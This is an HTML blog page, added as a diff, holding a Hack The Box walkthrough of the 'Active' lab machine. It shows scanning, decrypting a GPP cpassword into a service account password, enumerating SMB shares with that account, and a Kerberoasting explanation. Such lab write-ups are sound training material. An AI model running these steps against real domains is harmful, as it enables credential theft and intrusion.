@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <!-- Non social metatags -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="theme-color" content="#157878">
+
+    
+
+    <title>Htb Active</title>
+
+    
+      <!-- Update your html tag to include the itemscope and itemtype attributes. -->
+<html itemscope itemtype="http://schema.org/Article">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Place this data between the <head> tags of your website -->
+
+  <meta name="author" content="Srb_">
+
+<meta name="description" content="" />
+
+
+
+
+  <meta name="keywords" itemprop="category" content="">
+
+
+<!-- Schema.org markup for Google+ -->
+<meta itemprop="name" content="Htb Active">
+<meta itemprop="description" content="">
+
+  <meta itemprop="image" content="http://localhost:4000/">
+
+
+<!-- Twitter Card data -->
+<meta name="twitter:card" content="summary_large_image">
+
+
+
+<meta name="twitter:title" content="Htb Active">
+<meta name="twitter:description" content="">
+
+
+  <meta name="twitter:creator" content="@srb01246810">
+
+
+<!-- Twitter summary card with large image must be at least 280x150px -->
+
+  <meta name="twitter:image:src" content="http://localhost:4000/">
+  <meta property="twitter:image" content="http://localhost:4000/">
+
+<meta property="twitter:url" content="http://localhost:4000//offsec/2018/10/21/HTB-active.html">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Htb Active" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:4000//offsec/2018/10/21/HTB-active.html" />
+
+  <meta property="og:image" content="http://localhost:4000/" />
+
+<meta property="og:description" content="" />
+<meta property="og:site_name" content="Home" />
+
+  <meta property="article:published_time" content="2018-10-21T00:00:00-04:00" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <meta property="article:tag" content="offsec">
+  
+
+
+
+  <meta property="article:tag" content="">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:4000/offsec/2018/10/21/HTB-active.html">
+
+    
+
+    <link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
+    <meta name="robots" content="noarchive">
+
+    <!-- <link rel="alternate" media="only screen and (max-width: 640px)" href="">
+    <link rel="alternate" media="handheld" href=""> -->
+
+
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper">
+    
+    
+
+    
+      <a class="site-title" href="/">Home</a>
+    
+
+    
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+              <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+              <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+          
+            
+            
+              
+              
+            
+          
+            
+            
+              
+                <a class="page-link" href="/dev.html">Dev</a>
+              
+            
+          
+            
+            
+          
+            
+            
+              
+                <a class="page-link" href="/offSec.html">OffSec</a>
+              
+            
+          
+            
+            
+          
+        </div>
+      </nav>
+    
+  </div>
+</header>
+
+    
+    
+    
+
+    
+    <div style="padding-top: 10%; text-align: center">
+      <h1 class="project-name">Htb Active</h1>
+      <h2 class="project-tagline"></h2>
+    </div>
+    
+
+    <section class="main-content">
+
+      <div>
+
+  <p><img src="/assets/images/active.png" alt="" /></p>
+
+<h1 id="active-101010100">Active 10.10.10.100</h1>
+
+<h3 id="tools">Tools</h3>
+
+<ul>
+  <li>enum4linu</li>
+  <li>smbclient</li>
+  <li>smbspyder</li>
+  <li>ImPacket</li>
+</ul>
+
+<blockquote>
+  <p><strong>TL;DR</strong></p>
+
+  <p>Pwing a KDC by taking foothold with the cPassword identifiers found in an old GPP. I can’t execute commands, so I created a paquets to get a TGS from the CIFS service account and cracked the password. That gives me access to the Admin on this KDC!</p>
+</blockquote>
+
+<h4 id="scanning">Scanning</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/init 10.10.10.100
+enum4linux <span class="nt">-a</span> 10.10.10.100
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.01 scan initiated Wed Sep 26 21:45:08 2018 as: nmap -sC -sV -oA nmap.init 10.10.10.100
+Nmap scan report for 10.10.10.100
+Host is up (0.13s latency).
+Not shown: 983 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Windows 2003 Kerberos (server time: 2018-09-27 01:45:37Z)
+135/tcp   open  msrpc         Microsoft Windows RPC 
+139/tcp   open  netbios-ssn   Microsoft Windows 98 netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC 
+49153/tcp open  msrpc         Microsoft Windows RPC 
+49154/tcp open  msrpc         Microsoft Windows RPC 
+49155/tcp open  msrpc         Microsoft Windows RPC 
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
+49158/tcp open  msrpc         Microsoft Windows RPC 
+Service Info: OSs: Windows, Windows 98; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003, cpe:/o:microsoft:windows_98
+
+Host script results:
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Sep 26 21:46:43 2018 -- 1 IP address (1 host up) scanned in 94.85 seconds
+</code></pre></div></div>
+<h2 id="gainning-access">Gainning Access</h2>
+
+<p>Enum4linux shows that Replication can be listed, so by browsing the directories you can easily find:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient //10.10.10.100/Replication
+smb: \&gt; cd active.htb
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\&gt; get Registry.pol
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\&gt; get Groups\Groups.xml
+$ cat Groups\\Groups.xml 
+<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;User</span> 
+
+		<span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> 
+		<span class="na">name=</span><span class="s">"active.htb\SVC_TGS"</span> <span class="na">image=</span><span class="s">"2"</span> 
+		<span class="na">changed=</span><span class="s">"2018-07-18 20:46:06"</span> 
+		<span class="na">uid=</span><span class="s">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="nt">&gt;</span>
+
+		<span class="nt">&lt;Properties</span> 
+
+			<span class="na">action=</span><span class="s">"U"</span> 
+			<span class="na">newName=</span><span class="s">""</span> 
+			<span class="na">fullName=</span><span class="s">""</span> 
+			<span class="na">description=</span><span class="s">""</span> 
+			<span class="na">cpassword=</span><span class="s">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> 
+			<span class="na">changeLogon=</span><span class="s">"0"</span> 
+			<span class="na">noChange=</span><span class="s">"1"</span> 
+			<span class="na">neverExpires=</span><span class="s">"1"</span> 
+			<span class="na">acctDisabled=</span><span class="s">"0"</span> 
+			<span class="na">userName=</span><span class="s">"active.htb\SVC_TGS"</span><span class="nt">/&gt;</span>
+	<span class="nt">&lt;/User&gt;</span>
+<span class="nt">&lt;/Groups&gt;</span>
+</code></pre></div></div>
+
+<p>Note the <a href="https://pentestlab.blog/tag/cpassword/">cPassword</a> in the XML file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python gpocrack/gpocrack.py <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span>
+Password is: GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<blockquote>
+  <p>Well, so far that’s all I have!</p>
+</blockquote>
+
+<ul>
+  <li>User: SVC_TGS</li>
+  <li>DOMAIN: active.htb</li>
+  <li>Password=”GPPstillStandingStrong2k18”</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.100/Users -U=SVC_TGS%GPPstillStandingStrong2k18 
+smb: \SVC_TGS\Desktop\&gt; get user.txt 
+</code></pre></div></div>
+
+<h2 id="privesc">PrivEsc:</h2>
+
+<blockquote>
+  <p>This box was not trivial. You cannot simply execute commands with CME. In addition, the new accesses on the SMB sharing with the identifiers found were a rabbit hole.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec 10.10.10.100 -u SVC_TGS -p "GPPstillStandingStrong2k18" --shares  
+CME          10.10.10.100:445 DC              [*] Windows 6.1 Build 7601 (name:DC) (domain:ACTIVE)
+CME          10.10.10.100:445 DC              [+] ACTIVE\SVC_TGS:GPPstillStandingStrong2k18 
+CME          10.10.10.100:445 DC              [+] Enumerating shares
+CME          10.10.10.100:445 DC              SHARE           Permissions
+CME          10.10.10.100:445 DC              -----           -----------
+CME          10.10.10.100:445 DC              ADMIN$          NO ACCESS
+CME          10.10.10.100:445 DC              IPC$            NO ACCESS
+CME          10.10.10.100:445 DC              SYSVOL          READ
+CME          10.10.10.100:445 DC              C$              NO ACCESS
+CME          10.10.10.100:445 DC              Replication     READ
+CME          10.10.10.100:445 DC              NETLOGON        READ
+CME          10.10.10.100:445 DC              Users           READ
+</code></pre></div></div>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smbspider</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">SVC_TGS</span> <span class="o">-</span><span class="n">p</span> <span class="n">GPPstillStandingStrong2k18</span> <span class="o">-</span><span class="n">h</span> <span class="mf">10.10.10.100</span> <span class="o">-</span><span class="n">s</span> <span class="n">Users</span>
+
+ <span class="o">********************************************************</span>
+ <span class="o">*</span>     		        <span class="n">_</span>     				<span class="o">*</span>
+ <span class="o">*</span>    		       <span class="o">|</span> <span class="o">|</span>       <span class="o">//</span>  \\			<span class="o">*</span> 
+ <span class="o">*</span>	  <span class="n">___</span> <span class="n">_</span> <span class="n">__</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span><span class="n">__</span>    <span class="n">_</span>\\<span class="p">()</span><span class="o">//</span><span class="n">_</span>		<span class="o">*</span>
+ <span class="o">*</span>	 <span class="o">/</span> <span class="n">__</span><span class="o">|</span> <span class="s">'_ ` _ </span><span class="err">\</span><span class="s">| '</span><span class="n">_</span> \  <span class="o">/</span> <span class="o">//</span>  \\ \ 		<span class="o">*</span>
+ <span class="o">*</span>	 \<span class="n">__</span> \ <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span>   <span class="o">|</span>\<span class="n">__</span><span class="o">/|</span>			<span class="o">*</span>
+ <span class="o">*</span>	 <span class="o">|</span><span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">.</span><span class="n">__</span><span class="o">/</span>				<span class="o">*</span>
+ <span class="o">*</span>							<span class="o">*</span>
+ <span class="o">*</span> <span class="n">SMB</span> <span class="n">Spider</span> <span class="n">v2</span><span class="mf">.4</span><span class="p">,</span> <span class="n">Alton</span> <span class="n">Johnson</span> <span class="p">(</span><span class="n">alton</span><span class="o">.</span><span class="n">jx</span><span class="o">@</span><span class="n">gmail</span><span class="o">.</span><span class="n">com</span><span class="p">)</span> 	<span class="o">*</span>
+ <span class="o">********************************************************</span>
+
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Spidering</span> <span class="mi">1</span> <span class="n">system</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">...</span>
+
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="n">spider</span> <span class="n">smb</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.100</span><span class="o">/</span><span class="n">Users</span> 
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">desktop</span><span class="o">.</span><span class="n">ini</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">All</span> <span class="n">Users</span>\<span class="n">ATUS_STOPPED_ON_SYMLINK</span> <span class="n">listing</span> \<span class="n">All</span> <span class="n">Users</span>\
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="o">.</span><span class="n">LOG</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="o">.</span><span class="n">LOG1</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="o">.</span><span class="n">LOG2</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="p">{</span><span class="mi">016888</span><span class="n">bd</span><span class="o">-</span><span class="mi">6</span><span class="n">c6f</span><span class="o">-</span><span class="mi">11</span><span class="n">de</span><span class="o">-</span><span class="mi">8</span><span class="n">d1d</span><span class="o">-</span><span class="mf">001e0</span><span class="n">bcde3ec</span><span class="p">}</span><span class="o">.</span><span class="n">TM</span><span class="o">.</span><span class="n">blf</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="p">{</span><span class="mi">016888</span><span class="n">bd</span><span class="o">-</span><span class="mi">6</span><span class="n">c6f</span><span class="o">-</span><span class="mi">11</span><span class="n">de</span><span class="o">-</span><span class="mi">8</span><span class="n">d1d</span><span class="o">-</span><span class="mf">001e0</span><span class="n">bcde3ec</span><span class="p">}</span><span class="o">.</span><span class="n">TMContainer00000000000000000001</span><span class="o">.</span><span class="n">regtrans</span><span class="o">-</span><span class="n">ms</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">NTUSER</span><span class="o">.</span><span class="n">DAT</span><span class="p">{</span><span class="mi">016888</span><span class="n">bd</span><span class="o">-</span><span class="mi">6</span><span class="n">c6f</span><span class="o">-</span><span class="mi">11</span><span class="n">de</span><span class="o">-</span><span class="mi">8</span><span class="n">d1d</span><span class="o">-</span><span class="mf">001e0</span><span class="n">bcde3ec</span><span class="p">}</span><span class="o">.</span><span class="n">TMContainer00000000000000000002</span><span class="o">.</span><span class="n">regtrans</span><span class="o">-</span><span class="n">ms</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">SVC_TGS</span>\<span class="n">Desktop</span>\<span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Internet</span> <span class="n">Explorer</span>\<span class="n">Quick</span> <span class="n">Launch</span>\<span class="n">desktop</span><span class="o">.</span><span class="n">ini</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Internet</span> <span class="n">Explorer</span>\<span class="n">Quick</span> <span class="n">Launch</span>\<span class="n">Server</span> <span class="n">Manager</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Internet</span> <span class="n">Explorer</span>\<span class="n">Quick</span> <span class="n">Launch</span>\<span class="n">Shows</span> <span class="n">Desktop</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Internet</span> <span class="n">Explorer</span>\<span class="n">Quick</span> <span class="n">Launch</span>\<span class="n">Window</span> <span class="n">Switcher</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">SendTo</span>\<span class="n">Compressed</span> <span class="p">(</span><span class="n">zipped</span><span class="p">)</span> <span class="n">Folder</span><span class="o">.</span><span class="n">ZFSendToTarget</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">SendTo</span>\<span class="n">Desktop</span> <span class="p">(</span><span class="n">create</span> <span class="n">shortcut</span><span class="p">)</span><span class="o">.</span><span class="n">DeskLink</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">SendTo</span>\<span class="n">Desktop</span><span class="o">.</span><span class="n">ini</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">SendTo</span>\<span class="n">Mail</span> <span class="n">Recipient</span><span class="o">.</span><span class="n">MAPIMail</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Command</span> <span class="n">Prompt</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Desktop</span><span class="o">.</span><span class="n">ini</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Notepad</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Run</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Windows</span> <span class="n">Explorer</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Maintenance</span>\<span class="n">Desktop</span><span class="o">.</span><span class="n">ini</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Maintenance</span>\<span class="n">Help</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Accessibility</span>\<span class="n">Desktop</span><span class="o">.</span><span class="n">ini</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Accessibility</span>\<span class="n">Ease</span> <span class="n">of</span> <span class="n">Access</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Accessibility</span>\<span class="n">Magnify</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Accessibility</span>\<span class="n">Narrator</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">Accessibility</span>\<span class="n">On</span><span class="o">-</span><span class="n">Screen</span> <span class="n">Keyboard</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">System</span> <span class="n">Tools</span>\<span class="n">computer</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">System</span> <span class="n">Tools</span>\<span class="n">Control</span> <span class="n">Panel</span><span class="o">.</span><span class="n">lnk</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> \\<span class="mf">10.10.10.100</span>\<span class="n">Users</span>\<span class="n">Default</span>\<span class="n">AppData</span>\<span class="n">Roaming</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">Start</span> <span class="n">Menu</span>\<span class="n">Programs</span>\<span class="n">Accessories</span>\<span class="n">System</span> <span class="n">Tools</span>\<span class="n">Desktop</span><span class="o">.</span><span class="n">ini</span>
+ <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finished</span> <span class="k">with</span> <span class="n">smb</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.100</span><span class="o">/</span><span class="n">Users</span><span class="o">.</span> <span class="p">[</span><span class="n">Remaining</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> 
+
+<span class="o">-----</span>
+<span class="n">Completed</span> <span class="ow">in</span><span class="p">:</span> <span class="mf">46.9</span><span class="n">s</span>
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>Ok, let’s tease a bit that three heads bastard! ;)</p>
+</blockquote>
+
+<p>Since I have found valid credentials for the SVC_TGS service, I can ask kerberos for more; Request a legitimate TGT and which service(s) this account can use. Although I can’t execute commands as SVC_TGS with CME, I’m able to create packets with <a href="https://github.com/SecureAuthCorp/impacket">impacket </a> as if I were executing <code class="highlighter-rouge">ps&gt; klist</code> on the machine for example. This would give me the name(s) of the (SPNs)service principal name(s) to which the SVC_TGS account has access.</p>
+
+<p>Then, with an SPN and a TGT, I can create a TGS-REQ. The great thing about a TGS is that it allows you to crack the service password offline. Yeah! ;)</p>
+
+<p><img src="/assets/images/impacket_GetUserSPNs.png" style="height: 100%; width: auto" /></p>
+
+<p>Here we see that before requesting the TGS of a particular SPN, Impacket makes a request (AS_REQ) Authentication Server that responds with the TGT for the SVC_TGS account.</p>
+
+<p><img src="/assets/images/AS_REQ.png" style="height: 100%; width: auto" /></p>
+
+<p>Then Impacket makes a TGS request that includes TGT information. Finally, the server responds with a TGS and Impacket format it in <code class="highlighter-rouge">krb5tgs</code> which is recognized by JTR and HC.</p>
+
+<p><img src="/assets/images/TGS_REQ.png" style="height: 100%; width: auto" /></p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5tgs$<span class="nt">&lt;ENCRYPTION_TYPE&gt;</span>$*<span class="nt">&lt;USERNAME&gt;</span>$<span class="nt">&lt;REALM&gt;</span>$<span class="nt">&lt;SPN&gt;</span>*$<span class="nt">&lt;FIRST_16_BYTES_TICKET&gt;</span>$<span class="nt">&lt;REMAINING_TICKET_BYTES&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/krb5tgs.png" style="height: 100%; width: auto" /></p>
+
